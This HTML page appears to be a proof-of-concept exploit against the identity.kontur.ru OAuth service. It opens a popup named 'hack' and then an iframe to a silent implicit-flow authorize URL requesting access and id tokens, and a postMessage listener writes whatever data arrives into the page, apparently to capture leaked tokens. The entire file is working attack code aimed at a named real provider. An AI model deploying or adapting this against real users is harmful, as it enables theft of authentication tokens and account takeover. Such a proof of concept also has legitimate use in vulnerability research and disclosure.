<!doctype html>
<html>
  <body>
    <script>
      window.addEventListener("message", (event) => {document.body.innerHTML=JSON.stringify(event.data)}, false);
      const AUTH_URL = "https://identity.kontur.ru/connect/authorize?response_type=token+id_token&client_id=Csi.Support.Widget&scope=openid+Live-chat+Csi.Support.Api+Csi.Outages.Api+Csi.Feedbacks.Api+Csi.IncidentChecker.Api+profile+email&redirect_uri=https%3A%2F%2Fidentity.kontur.ru%2Fsilent-auth.html&prompt=none&nonce=pF0zJfMaXtrfnwPioJ81KSDYaDPB6hOB";

      // Открываем попап
      const popup = open(
        AUTH_URL,
        "hack",
        "width=800,height=300,top=500,left=200"
      );

      // Через 2 секунды — закрываем попап (если получится) и вставляем iframe
      setTimeout(() => {
        try { if (popup && !popup.closed) popup.close(); } catch (_) {}

        const iframe = document.createElement("iframe");
        iframe.src = AUTH_URL;
        iframe.style.cssText = "width:100%;height:600px;border:0;display:block;";
        document.body.appendChild(iframe);
      }, 4000);
    </script>
  </body>
</html>
